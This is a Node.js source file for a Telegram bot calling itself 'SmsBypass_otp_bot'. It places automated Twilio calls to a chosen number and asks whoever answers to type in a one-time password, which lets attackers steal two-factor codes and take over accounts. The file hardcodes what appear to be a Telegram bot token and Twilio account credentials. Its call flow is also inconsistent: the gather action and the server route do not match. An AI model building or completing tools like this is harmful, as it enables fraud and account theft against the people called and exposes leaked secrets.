const { Telegraf } = require('telegraf'); // importing telegraf.js
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
var bot = new Telegraf(bot_token)
const accountSid = 'ACc1e28d24ec07899a6bb94af38ab9a31c';
const authToken = 'b90ab5caf73ed1da0355d8d0dd7e319c';
const twilio_cell_number = '+14179322556'
const client = require('twilio')(accountSid, authToken);

const express = require('express');
const app = express();
const port = process.env.PORT || 3000;


function call (number, ctx){
   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${number} \n please wait...`, {})

   client.calls
         .create({
            twiml: '<Response><Gather input="dtmf" timeout="20" action = "/collect_otp"><Say>Please type in the One time Password which we sent to you</Say></Gather></Response>',
            to: `${number}`,
            from: twilio_cell_number
         })
         .then((call) => {
            console.log(call.sid)
            bot.telegram.sendMessage(ctx.chat.id, `call ended, otp is loading...`, {})
         });

}


//  COMMANDS


bot.command('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(ctx.chat.id, 'hello there! Welcome to SmsBypass_otp_bot.', {})
})

bot.help(ctx => ctx.reply(`
   '''How to use this bot'''\n
   /call 'cell number'\n
   \n
   Thank you for using this service
`))

bot.command('call', ctx => {
   const number = ctx.message.text.split(' ')[1];

   bot.telegram.sendMessage(ctx.chat.id, `Placing call, please wait...`, {}).then(() =>{
      call(number, ctx)      
   })

})
bot.launch();

app.post('/process_gather', (req, res) => {
   const digits = req.body.Digits;
   console.log(digits);
   res.send(`<Response><Say>You entered ${digits}</Say></Response>`);
 });
 
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
 

